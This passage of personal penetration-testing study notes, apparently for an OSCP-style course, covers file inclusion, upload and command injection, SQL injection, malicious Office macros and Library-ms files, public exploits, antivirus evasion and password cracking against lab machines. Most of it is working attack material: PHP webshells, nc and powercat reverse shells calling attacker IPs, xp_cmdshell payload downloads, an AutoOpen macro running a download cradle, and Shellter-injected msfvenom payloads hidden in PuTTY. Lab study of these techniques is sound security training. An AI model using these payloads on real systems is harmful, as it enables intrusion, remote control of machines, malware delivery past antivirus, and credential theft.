>curl "http://192.168.244.16/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
```

![Untitled](Untitled%2019.png)

Getting Uname -a using PHP data

Use proper encoding “[http://192.168.244.16/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=uname -a](http://192.168.244.16/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=uname%20-a)”

![Untitled](Untitled%2020.png)

### Remote File Inclusion - RFI

Remote file inclusion (RFI) vulnerabilities are less common than LFIs since the target system must be configured in a specific way. In PHP web applications, for example, the **allow_url_include** option needs to be enabled to leverage RFI,

```bash
>http://192.168.187.16/meteor/index.php?page=admin.php
>curl "http://192.168.187.16/meteor/index.php?page=http://192.168.45.215/simple-backdoor.php&cmd=ls%20-al%20/home/elaine/.ssh/" (check files and permissions)
>curl "http://192.168.187.16/meteor/index.php?page=http://192.168.45.215/simple-backdoor.php&cmd=cat%20/home/elaine/.ssh/authorized_keys"
https://github.com/pentestmonkey/php-reverse-shell in that change the IP and Port listen Netcat on local IP address and port
>http://192.168.187.16/meteor/index.php?page=http://192.168.45.215/php-reverse-shell.php
```

## File Upload Vulnerabilities

There are 3 common type File Upload Vulnerabilities

1. Consists of vulnerabilities enabling us to upload files that are executable by web application, For example, if we can upload a PHP Script to web server where PHP is enabled.
2. Combine the file upload vulnerability mechanism with another vulnerability, such as Directory Traversal. We can use relative path in the file upload request and try to override the files like **SSH authorized keys**.
3. The third category relies on user interaction. For example, when we discover an upload form for job application, we can try to upload a CV in **.docx** format with malicious macros integrated**.** Since this category requires a person to access our uploaded file**.**

```bash
###Windows
>http://192.168.187.189/meteor/uploads/simple-backdoor.pHP?cmd=dir
>http://192.168.187.189/meteor/uploads/simple-backdoor.pHP?cmd=type%20C:\xampp\passwords.txt
```

Trying to upload the PHP files after uploading it’s showing 404 error, so decided to upload the .txt so that we can successfully uploaded.

I’m using Linux Operating System, so root user will be their, from my Kali OS generated a 

>ssh-keygen (it generate 2 file name, name.pub)

>cat [name.pub](http://name.pub) > authorized_keys

upload this data into browser captered request in burp change path like this “../../../../../../../root/.ssh/authorized_keys”

after that logged in using 

>ssh -i name -p 2222 root@<IP> (name is sshkeys generated, 2222 is open port)

## Common Injection

Web applications often need to interact with the underlying operating system, such as when a file is created through a file upload mechanism. **Web applications should always offer specific APIs or functionalities that use prepared commands for the interaction with the system**. Prepared commands provide a set of functions to the underlying system that cannot be changed by user input. However, these APIs and functions are often very time consuming to plan and develop.

![Untitled](Untitled%2021.png)

![Untitled](Untitled%2022.png)

Getting IP address, based **NMAP** result it’s Windows OS using encoding for space **%3B**

![Untitled](Untitled%2023.png)

Find out which terminal executing the commands

`(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell`

![Untitled](Untitled%2024.png)

```bash
###ENcode this payload according to powershell
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell
```

**Encode above payload** send it to the server, my KALI OS IP 192.168.45.204

![Untitled](Untitled%2025.png)

Host **python server** and use **netcat (nc -nlvp 4444)** ger shell

![Untitled](Untitled%2026.png)

In Linux OS like same windows version, try using **SUDO SU**

![Untitled](Untitled%2027.png)

![Untitled](Untitled%2028.png)

### Finding command Injection

Try payloads **test"&&cat /etc/passwd”**

![Untitled](Untitled%2029.png)

```bash
###Using burp suite
username=yelnats&password=ADMIN&ffa="id;cd ..;pwd;sudo ls root;sudo cat /root/flag.txt"
```

### Finding windows path reverse shell

IN windows these are the open ports

![Untitled](Untitled%2030.png)

Web server running at port 8000 and it feature to upload the files, check http headers either in burp suite or curl.

after uploading the payload check in the windows OS **webroot** c:\inetpub\wwwroot, to access windows OS uploaded reverse shell path is **:80/name.aspx, :8000/name.aspx** check different port paths 

![Untitled](Untitled%2031.png)

# 10 SQL Injection Attacks

## SQL Theory and Databases

```bash
###MYSQL Remore Connection
>mysql -u root -p'root' -h 192.168.50.16 -P 3306
>select version();
>select system_user(); (# current user)
>show databases(); # List of Databases)
>SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';

###MSSQL Remore Connection
>impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth (#Windows authentication)
>select @@version;
>SELECT name FROM sys.databses;
>SELECT * FROM <database_name>.information_schema.tables;
>Select * from offsec.dbo.users;
```

## Manual SQL Exploitation

*SQL injection is considered in-band when the vulnerable application provides the result of the query along with the application-returned value. **below example***

![Untitled](Untitled%2032.png)

```bash
'ERROR Based SQL Injection'
#payload offsec' or 1=1 -- //
>SELECT * FROM users WHERE user_name = 'offsec' OR 1=1 --
' or 1=1 in (select @@version) -- //
' OR 1=1 in (SELECT * FROM users) -- //
' or 1=1 in (SELECT password FROM users) -- //
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //

'Union-Based SQL Injection'
<Backend query<$query = "SELECT * from customers WHERE name LIKE '".$_POST["search_input"]."%'";
' ORDER BY 1-- // (#indentifying number of columns present)
%' UNION SELECT database(), user(), @@version, null, null -- //
' UNION SELECT null, null, database(), user(), @@version  -- // (In the above command database value is not returning so changing the position of database)
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
' UNION SELECT null, username, password, description, null FROM users -- // (Based on previous response column name)'

'Blind SQL Injection' - boolean- or time-based logic.
>http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //
>http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
```

## Manual and Automated Code Execution

`' UNION SELECT null,"<?php system($_GET['cmd']);?>",  null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //`

```bash
###Manual Code Execution
>impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
>EXECUTE sp_configure 'show advanced options', 1;
>RECONFIGURE;
>EXECUTE sp_configure 'xp_cmdshell', 1;
>RECONFIGURE;

###webshell through MSSQL
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
<? system($_REQUEST['cmd']); ?> (code)
## to access or trigger the webshell  
>http://IP/tmp/webshell.php?cmd=id

###Automated TOol
>sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user
>sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump
>sqlmap -u http://192.168.XXX.19:80/blindsqli.php?user=1 -D offsec -T users -C description --dump --batch --answers='redirect=N,use=N'
sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"
```

### Wordpress SQLI Injection

If automated tool is not working stopped then use, a CURL command 

curl [http://alvida-eatery.org/wp-admin/admin-ajax.php?action=get_question&question_id=122 union select 1%2C1%2Cchar(116%2C101%2C120%2C116)%2Cuser_login%2Cuser_pass%2C0%2C0%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull from wp_users](http://alvida-eatery.org/wp-admin/admin-ajax.php?action=get_question&question_id=122%20union%20select%201%2C1%2Cchar(116%2C101%2C120%2C116)%2Cuser_login%2Cuser_pass%2C0%2C0%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%20from%20wp_users)

![Untitled](Untitled%2033.png)

SQL Injection Subscription box, captured into burpsuite, first using 

**ashok@gmail.com ‘order by 1 — //** increasing number 1 to 10 their are 6 columns

![Untitled](Untitled%2034.png)

![Untitled](Untitled%2035.png)

previous one not worked sql injection, payload error and position change to 5

> ' union select null,null,null,null,'<?php+system($_GET["cmd"]); ?>',null into outfile '/var/www/html/rce.php'#
> 

![Untitled](Untitled%2036.png)

Error with the using this payload **`/usr/bin/nc 192.168.45.157 4455 -e sh`** must specify the path of **sh** 

> **%2Fusr%2Fbin%2Fnc%20192.168.45.157%204455%20-e%20%2Fusr%2Fbin%2Fsh**
> 

![Untitled](Untitled%2037.png)

flag.txt - **find / -type f -name "flag.txt”**

![Untitled](Untitled%2038.png)

### Postgre SQL Injection

Identified injection at filling the form, and the parameter height trying for SQL injection tried with single quote ‘ got an error stating that vulnerable parameter.

[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL Injection/PostgreSQL Injection.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md)

> **Hints**
> 

1) Test for SQL injection by adding a single quote (') to each input parameter and check for errors.
2) Identify the vulnerable parameter and use the ORDER BY statement to determine the number of columns.
3) For error-based SQL injection, use the CAST() function to convert data into an incompatible type, triggering an error message with the data.
Alternatively, look for known vulnerabilities specific to the database system in use, like CVE-2019-9193 for PostgreSQL.

![Untitled](Untitled%2039.png)

changing the payload cast((select version()) as int), (select version()), (select 1=version()), select version(), 

```bash
cast((select version()) as int), (select version()), (select 1=version()), select version(), 
cast(current_user+as+int)
cast(passwd as int),null,null,null,null from pg_shadow

```

Entire payload:- weight=2&height=22'union select null,cast((select version()) as int), null, null, null, null -- //&age=22&gender=Male&email=ashok%[40ashok.com](http://40ashok.com/)

![Untitled](Untitled%2040.png)

Retrieve password is md5ae8c67affdb169a42c9631c02fc67ede

![Untitled](Untitled%2041.png)

exploit through metasploit

use exploit/multi/postgres/postgres_copy_from_program_cmd_exec

below are values like username and password

![Untitled](Untitled%2042.png)

flag - find / -type f -name flag.txt

![Untitled](Untitled%2043.png)

### MS SQL Injection Windows

Explore the web page with input fields, find that only login page tried with ‘ in both username and password field showing an sql error.

![Untitled](Untitled%2044.png)

Identified username field is vulnerable with 2 columns 'order by 2—

```bash
Payloads
>EXECUTE sp_configure 'xp_cmdshell', 1; (# encode this payloads)
>';EXECUTE xp_cmdshell 'powershell "Invoke-WebRequest -Uri http://192.168.45.248/nc64.exe -OutFile C:\windows\temp\nc64.exe"';--
>';EXECUTE xp_cmdshell 'C:\windows\temp\nc64.exe 192.168.45.248 4455 -e cmd.exe';--
>powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.24:70/tmp/powercat.ps1');powerrcatt -c 192.168.45.244 -p 1234 -e cmd"
>powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.244:70/tmp/nc64.exe');nc.exe  192.168.45.244 1234 -e cmd.exe
###Student mentor working trasfer nc.exe
You'll need to send the following payloads in 4 requests using Burp Repeater. Remember to use URL-Encoding.

>';EXEC sp_configure 'show advanced options', 1;--
>';RECONFIGURE;--
>';EXEC sp_configure "xp_cmdshell", 1;--
>';RECONFIGURE;--
After enabling xp_cmdshell, we will transfer nc64.exe binary to the target. 
**use URL-Encoding**
=> In burpsuite username parameter
>';EXEC xp_cmdshell "certutil -urlcache -f http://192.168.45.248/nc64.exe c:/windows/temp/nc64.exe";--
>';EXEC xp_cmdshell 'c:\windows\temp\nc.exe 192.168.45.248 4455 -e cmd.exe';--
```

![Untitled](Untitled%2045.png)

Windows flag >**dir /s /b *.txt** find

![Untitled](Untitled%2046.png)

# 11 Client-side Attacks

Client side attacks first identify the target using Operating system based on that we can proceed with the attacks include USB dropping, water hole attacks. Develop knowledge about human psychology, corporate culture and social norms.  if it’s windows JScript, Windows Script Host, lnk, leverage Windows library files.

## 11.1 Target Reconnaissance

In penetration testing phase start accessing website, find any documents are available in the website like PDFs, DOCS like that, Do the directory search with **gobuster** with some extensions. 

```bash
>exiftool -a -u info.pdf
>gobuster dir -u http://192.168.222.197/ -w /usr/share/wordlists/dirb/common.txt -x pdf
```

Fingerprinting

[https://canarytokens.org](https://canarytokens.org/)

[https://grabify.link/](https://grabify.link/)

## 11.2 Exploiting Microsoft Office

Remote Windows Desktop

> xfreerdp /u:offsec /p:lab /v:192.168.201.196
> 

Microsoft Office applications like Word and Excel allow users to embed macros, **which are a series of commands and instructions grouped together to programmatically accomplish a task.** Organizations often use macros to manage dynamic content and link documents with external content. written **VBA** script, full access to **ActiveX** objects and **Windows Script Host**.

Older version .**doc** file containing macros inside, Newer version .**docx** file type cannot save macros without attaching a containing template. This means that we can run macros with in .**docx** file but we can’t embed or save the macro in the document. In other words, the macro is not persistent. Alternatively, we could also use the .**docm** file type for our embedded macro.

```visual-basic
Sub Mymacro()
   CreateObjects("Wscript.Shell").Run "Powershell"
End Sub
```

Since Office macros are not executed automatically, we must use the predefined **AutoOpen** macro and **Document_Open** event below is updated code

```visual-basic
Sub AutoOpen()
   Mymacro
End Sub
Sub Document_Open()
   Mymacro
End Sub
Sub Mymacro()
   CreateObject("Wscript.shell").Run "Powershell"
End Sub
```

We’ll declare a string variable name str with the Dim keyword, which we’ll use to store our PowerShell download cradle.

```visual-basic
Sub AutoOpen()
   Mymacro
End Sub
Sub Document_Open()
   Mymacro
End Sub
Sub Mymacro()
Dim Str As String
   CreateObject("Wscript.shell").Run Str
End Sub
```

Download powercat

```visual-basic
>IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell
Below snap encoding mechanism 
```

Change to specific encoding

![Untitled](Untitled%2047.png)

After that divide into 50 chunks powershell don’t more then limit.

![Untitled](Untitled%2048.png)

MyMacro format with below

![Untitled](Untitled%2049.png)

I have added the Domain in the hosts file **C:\Windows\System32\drivers\etc\hosts** file

Uploaded the ticket.doc in the target website after 3 minutes got the shell and flag.

## 11.3 Abusing Windows Library Files Windows

Windows Library files are virtual containers for the user content. They connect to users with data stored in remote locations like web servers or shares.

### Windows LNK file setup WebDAV .Library-ms

TO demonstrate this, we’ll first set up a WebDAV share on kali system, We’ll use WsgiDAV

```visual-basic
>mkdir /home/kali/webdav
>touch /home/kali/webdav/test.txt
>/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/ (#it will start webdav server)
>
-----------------------Start of File------------------------
>INSIDE FILE config.Library-ms
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.119.2</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
---------------------------end of File-----------------

In Windows Desktop > RIghtCLick > New > Shortcut
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.218:8000/powercat.ps1');powercat -c 192.168.45.218 -p 4444 -e powershell"

--------------Till above Same steps ----------------Based target open ports steps change

#One Way
>smbclient //192.168.50.195/share -c 'put config.Library-ms' (#Target windows IP address)
┌──(kali㉿kali)-[~/webdav]
└─$ python3 -m http.server 8000 (#here contain powercat.ps1 so using above powershell pulls powercat file)
>nc -nvlp 4444 (#you will get shell from SMB target mchine)

#Another Way
This below machine has SMTP port open sending to email using swanks, and port 80 is also open given user/password
**Refer below snapshot**
>sudo swaks -t dave.wizard@supermagicorg.com --from test@supermagicorg.com -ap --attach config.Library-ms --server 192.168.186.199 --body body.txt --header "Subject: Problems" --suppress-data
┌──(kali㉿kali)-[~/webdav]
└─$ python3 -m http.server 8000 (#here contain powercat.ps1 so using above powershell pulls powercat file)
>nc -nlvp 4444 (#you will get shell from SMTP target)
```

1. Scan the ports with nmap.
2. Start by fuzzing the webserver for some hidden files (pdf,txt) using gobuster or ffuf.
3. Download any files you have found directly with tools like wget for futre anaylsis such as the creator of the file.
4. Use the commands provided in Listing 11 to host any malicious file and send the email.
5. Make sure you mount the correct path where you have the Webdav folder! Is it root/webdav or /home/kali/webdav?
6. Do not limit yourself with only tool and search for other powershell reverse shells.

![Untitled](Untitled%2050.png)

# 12 Locating Public Exploits

In this section discussed about the 

1. Online **Exploit DB, Packet Storm, GitHub, Google Search Operator** to finding public exploits.
2. Offline Exploits are **Exploit DB frame in kali, Searchsploit, Nmap NSE.**

### Machine 1 Linux Port 22,80 qdPM 9.1

```visual-basic
#In this machine 22, 80 is open.
>dirb http://192.168.198.11 -r
Revealed path http://192.168.198.11/project/ (# indicating the version qdPM 9.1)
#Generated a list of password using cewl
>cewl http://192.168.198.11 > Passwords_AIDevCorp
#Username are available in about page of the website put into a testfile
#MAKESURE user same URL  (http://192.168.198.11/project/ even if remove the last slash backdoor not  working)
>python3 50944.py -url http://192.168.198.11/project/ -u george@AIDevCorp.org -p AIDevCorp 
#backdoor uploaded to http://192.168.198.11/project/uploads/users/162160-backdoor.php?cmd=whoami
>curl http://192.168.198.11/project/uploads/users/162160-backdoor.php --data-urlencode "cmd=tail /etc/passwd"
#Netcat is available on target system getting reverse shell
>curl http://192.168.198.11/project/uploads/users/162160-backdoor.php --data-urlencode "cmd=nc 192.168.45.218 6666 -e /bin/bash"
>nc -nlvp 6666 (#Anther Tab)
```

### Machine 2 Windows port 135,139,445

```visual-basic
#It has 3 open ports 135,139,445 No web innterface
>smbclient -L 192.168.198.10 (# Other tools not given much details like enum4linux, nbtstat,smbmap)
>smbclient //192.168.198.10/offsec (#Logged IN)
#I can see the flag in inside Desktop folder not able view and download
#payload is selected because in offsec user's Downloads folder **MouseServer.exe** running 
search in searchsploit
>msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.218 LPORT=4444 -f exe > reverse.exe
>nc -nlvp 4444
49601,50972 (Both are worked)
```

User’s downloads folder installed applications **MouseServer,**

Search like

>searchsploit **Mouse Server (**given wifi mouse based on that found 4 similar one’s**)**

Before getting the shell, I observed that, from **PYTHON HTTP SERVER** downloading the ****payload below screenshot

![Untitled](Untitled%2051.png)

Msfvenom payload and 49601.py,  [50972.py](http://50972.py) (Both are worked)

![Untitled](Untitled%2052.png)

### Machine 3 Linux port 80 Apache 2.4.49 [50383.sh](http://50383.sh) 50512.py

```bash
Using Nmap results port 80 
1. Apche 2.4.49 is 50383.sh (CVE-2021-41773)
2.Using the CVE number identified another script 50512.py
For interactive shell sh bash #https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#reverse-shell
Victim:
>sh -i >& /dev/udp/10.0.0.1/4242 0>&1
Listener:
>nc -u -lvp 4242
```

![Untitled](Untitled%2053.png)

Choice type 0, exploit type Y

![Untitled](Untitled%2054.png)

### Machine 4 Linux port 22, JAMES Remote Admin 2.3.2 [50347.py](http://50347.py/)

```bash
Nmap Scan reveled only open 22 SSH port.
IN the machine specs 32826 ssh ports with credentials to login SSH.
After Scanning all ports revelled

---------------------start------------------------------
22/tcp    open  ssh         OpenSSH 8.4p1 Ubuntu 5ubuntu1.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 67:2f:bf:fe:a6:61:4d:13:68:62:e4:ab:d3:c9:8e:50 (RSA)
|   256 7c:3c:8e:ea:64:48:2a:75:5b:86:c8:5d:d0:69:b1:fc (ECDSA)
|_  256 74:48:13:a7:a2:97:bf:93:cc:21:e4:8e:9e:ef:20:ce (ED25519)
32822/tcp open  james-admin JAMES Remote Admin 2.3.2
32823/tcp open  nntp        JAMES nntpd (posting ok)
32824/tcp open  pop3        JAMES pop3d 2.3.2
32825/tcp open  smtp        JAMES smtpd 2.3.2
|_smtp-commands: 7e4354d63ccc Hello nmap.scanme.org (192.168.45.218 [192.168.45.218])
32826/tcp open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4e:7a:b4:a3:82:d1:a0:15:fd:4d:0f:0b:b2:62:de:fb (RSA)
|   256 bc:c7:cf:1b:17:f6:eb:3b:3f:d1:3a:1f:d5:d4:bd:bf (ECDSA)
|_  256 4c:5a:7c:6f:e7:92:72:1d:3f:15:71:89:aa:7e:6e:a2 (ED25519)
Service Info: Host: 7e4354d63ccc; OS: Linux; CPE: cpe:/o:linux:linux_kernel
---------------------end------------------------------

>searchsploit JAMES 2.3.2 (50347.py)
>nano 50347.py(# change the ports running according to server running 32822 and smtp is 32825 changed these posts)
>python3 50347.py 192.168.215.52 192.168.45.218 4444 (#Intially tried these port not working change to 443,80 then its working)
>python3 50347.py 192.168.215.52 192.168.45.218 80
```

# 13 Fixing Exploits

### Buffer Overflow

1. The heap is dynamically managed and typically stores large chunks of globally-accessible data.
2. Stack purpose is to store functions data and its size is generally fixed. Ex- buffer overflow can occur, let’s review the following two-liner partial C code.

```bash
#Code
>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.4 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
>i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
```

### Fixing Web Exploits

```bash
Does it initiate an HTTP or HTTPS connection?
Does it access a specific web application path or route?
Does the exploit leverage a pre-authentication vulnerability?
If not, how does the exploit authenticate to the web application?
How are the GET or POST requests crafted to trigger and exploit the vulnerability? Is there any HTTP method involved?
Does it rely on default application settings (such as the web path of the application) that may have been changed after installation?
Will oddities such as self-signed certificates disrupt the exploit?
```

### Linux **CMS Made Simple 2.2.5 44976.py**

CVE- 2018-1000094 [exploit db](https://www.exploit-db.com/exploits/44976)

Edited highlighted fields

![Untitled](Untitled%2055.png)

Payload at no in the normal location

![Untitled](Untitled%2056.png)

Payload will be available on [http://192.168.220.52/cmsms/uploads/shell.php?cmd=id](http://192.168.220.52/cmsms/uploads/shell.php?cmd=id)

the flag can able to identify using **curl [http://192.168.220.52/cmsms/uploads/shell.php?cmd=cat /home/flag.txt](http://192.168.220.52/cmsms/uploads/shell.php?cmd=cat%20/home/flag.txt)**

### Linux ports 22,80,3389, elfinder 46481.py

[payload](https://www.exploit-db.com/exploits/46481) 

I have added one dummy image in path of exploit like 

**>cp /var/lib/inetsim/http/fakefiles/sample.jpg SecSignal.jpg**

![Untitled](Untitled%2057.png)

### Windows ports 135,139,445,20000 Easy chat Server

```bash
#Hints
>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.209 LPORT=443 -f python -b "\x00\x20" -v shellcode
Then we can start a msf listener:
>msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.45.209;set LPORT 443;run;"
Simply run the exploit using:
>python2 easy.py 192.168.X.213 20000
```

Make sure to include highlighted line

![Untitled](Untitled%2058.png)

Modify the code, add the first line (**in buffer overflow every time revert machine**)

![Untitled](Untitled%2059.png)

>nc -nlvp 443 (got shell)

# 14.Antivirus Evasion

To transfer a file from a Windows transfer (no internet connection) computer to an Kali Linux machine.

Transfer files windows to kali linux

```bash
#First setup and run listener
>nc -l -p 12345 > <FILENAME>
#Next on the target machine use NC
>nc.exe <KALI_IP_address> 12345 < <FILENAME>
#TO check hash of file 
windows> certutil -hashfile <filename> MD5
Linux>md5sum <filename>
#SSH Transfer files windows to kali linux
> sudo service ssh start (Kali)
>C:\Users\jason\Documents> scp Database.kdbx kali@192.168.45.155:/home/kali/Desktop(Windows)
```

### Bypassing Antivirus Detections

 Antivirus evasion falls into two broad categories: ***on-disk*** and ***in-memory***. On-disk evasion focuses on modifying malicious files physically stored on disk in an attempt to evade AV file engine detections. However, given the maturity of modern AV file scanning engines, modern malware often attempts in-memory operation, which avoids the disk entirely and therefore, reduces the possibility of being detected.

```bash
#Bypass the payload using Antivirus
>msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=21 EXITFUNC=thread -f raw > payload.bin
>shellter -f SpotifySetup.exe -p payload.bin --encode --handler iat --polyIAT --polyDecoder
>msfconsole -qx "handler -H tun0 -P 21 -p windows/meterpreter/reverse_tcp
```

```bash
Capstone Exercise: In this exercise, you'll be facing off against COMODO antivirus engine running on Module Exercise VM #1. Use another popular 32-bit application, like PuTTY, to replicate the steps learned so far in order to inject malicious code in the binary with Shellter. The victim machine runs an anonymous FTP server with open read/write permissions. Every few seconds, the victim user will double-click on any existing .exe file(s) in the FTP root directory. If the antivirus flags the script as malicious, the script will be quarantined and then deleted. Otherwise, the script will execute and hopefully, grant you a reverse shell. NOTE: set the FTP session as active and enable binary encoding while transferring the file.
Hint
1) Download the binary from https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe
2) Remember to set the FTP session as active: ftp -A 192.168.xxx.53 and enable binary mode: ftp> bin
#If passive mode is off, it means that acive mode is ON, for switching use command > **passive
>msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 EXITFUNC=thread -f raw > payload.bin
>sudo shellter
>sudo shellter -f putty.exe -p payload.bin --encode --handler iat --polyIAT --polyDecoder
#Method should be 6 (below selected 5)**
0. VirtualAlloc --> N/A
1. VirtualAllocEx --> N/A
2. VirtualProtect --> N/A
3. VirtualProtectEx --> N/A
4. HeapCreate/HeapAlloc --> N/A
5. LoadLibrary/GetProcAddress --> IAT[4fee50]/IAT[4fedc8]
6. GetModuleHandle/GetProcAddress --> IAT[4fedbc]/IAT[4fedc8]
7. CreateFileMapping/MapViewOfFile --> IAT[4fecfc]/IAT[4fee70]
Using Method --> 5
```

If passive mode is off, it means that acive mode is ON, for switching use command > **passive**

![Untitled](Untitled%2060.png)

```bash
#Generate payload using veli framework 
https://cyberarms.wordpress.com/2018/05/29/anti-virus-bypass-with-veil-on-kali-linux/
>ftp -A 192.168.220.53 (Active mode)
>msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.45.244;set LPORT 4444;run;"
```

# 15. Password Attacks

## Attacking Network Services Logins

**hydra like tool crowbar** 

```bash
#password brute forcing tools
>sudo gzip -d rockyou.txt.gz
>hydra -l george -P rockyou.txt -s 2222 ssh://192.168.220.201
>hydra -L Usernames -p "SuperS3cure1337#" rdp://192.168.220.202
>xfreerdp /v:192.168.220.202  /u:'justin' /p:'SuperS3cure1337#’
>hydra -l itadmin -P rockyou.txt ftp://192.168.194.202

#HTTP POST Login Forms
>hydra -l admin -P rockyou.txt 192.168.194.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid username or password"
when you enter the IP address asking for credentials 
>hydra -l admin -P rockyou.txt http-get://192.168.194.201 
```

## Password Cracking Fundamentals

```bash
#You extracted the MD5 hash "056df33e47082c77148dba529212d50a" from a target system. Create a rule to add "1@3$5" to each password of the rockyou.txt wordlist and crack the hash.
>hashcat -r demo2.rule --stdout demo.txt (#for checking rules)
>cat demo1.rule 
$1 $@ $3 $$ $5
#crack.txt (056df33e47082c77148dba529212d50a)
>hashcat -m 0 crack.txt rockyou.txt -r demo1.rule --force

#You extracted the MD5 hash "19adc0e8921336d08502c039dc297ff8" from a target system. Create a rule which makes all letters upper case and duplicates the passwords contained in rockyou.txt and crack the hash.
>cat demo2.rule 
u d
>crack.txt (19adc0e8921336d08502c039dc297ff8)
>hashcat -m 0 crack.txt rockyou.txt -r demo2.rule --force
```

### Hash Identifier

Their are 2 tools 1.hash-identifier, 2.hasid used to identify the hash.

There is a difference between ‘’ (Single-quote) and “” (Double-quote) in identifying hashes

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/OSCP/password]
└─$ hashid "4a41e0fdfb57173f8156f58e49628968a8ba782d0cd251c6f3e2426cb36ced3b647bf83057dabeaffe1475d16e7f62b7"
Analyzing '4a41e0fdfb57173f8156f58e49628968a8ba782d0cd251c6f3e2426cb36ced3b647bf83057dabeaffe1475d16e7f62b7'
[+] SHA-384 
[+] SHA3-384 
[+] Skein-512(384) 
[+] Skein-1024(384) 
                                                                                                                                                                                       
┌──(kali㉿kali)-[~/Desktop/HTB/OSCP/password]
└─$ hashid '$2y$10$XrrpX8RD6IFvBwtzPuTlcOqJ8kO2px2xsh17f60GZsBKLeszsQTBC'                                    
Analyzing '$2y$10$XrrpX8RD6IFvBwtzPuTlcOqJ8kO2px2xsh17f60GZsBKLeszsQTBC'
[+] Blowfish(OpenBSD) 
[+] Woltlab Burning Board 4.x 
[+] bcrypt 
```

### Password Manager

There are 2 popular password managers 1password, KeePass

The Keepass save file as Database.kdbx to the crack the below process

```bash
#SSH Transfer files windows to kali linux
> sudo service ssh start (Kali)
>C:\Users\jason\Documents> scp Database.kdbx kali@192.168.45.155:/home/kali/Desktop(Windows)
#Download Database.kdbx
>ls -la Database.kdbx
>keepass2john Database.kdbx > keepass.hash
>cat keepass.hash
Database:$keepass$*2*1*0*b1a85c5029830d00eead372eff9b2c0c5f2b78d8adf6090568429ba7b9622f25*27ab0d96aaacbb427dc6e9746fcf5148a468d042855186d3d1409d40ca018fa1*2eb108ae671a4aebcfa4217b5dcdccdc*ea47adcf48185eb7d670b25a3b2f8a535eb72339bbdf2e0d05c892bad22287f0*e250173255fbe9861707502ebef385c839fd328dac2f7874ff3b0bfc13cf4b56
>cat Keepass.hash (#Remove the database keyword from the file)
$keepass$*2*1*0*b1a85c5029830d00eead372eff9b2c0c5f2b78d8adf6090568429ba7b9622f25*27ab0d96aaacbb427dc6e9746fcf5148a468d042855186d3d1409d40ca018fa1*2eb108ae671a4aebcfa4217b5dcdccdc*ea47adcf48185eb7d670b25a3b2f8a535eb72339bbdf2e0d05c892bad22287f0*e250173255fbe9861707502ebef385c839fd328dac2f7874ff3b0bfc13cf4b56
>hashcat --help | grep -i "KeePass"
>hashcat -m 13400 keepass.hash rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force 
pinkpanther1234
#get the password of Keepass password manager, then you can access all the password
```

### SSH Private Key Passphrase

First login with the website based on credentials provided in the website, after that their is some of the file like **id_rsa** and **note.txt** it has passwords of **dave** user

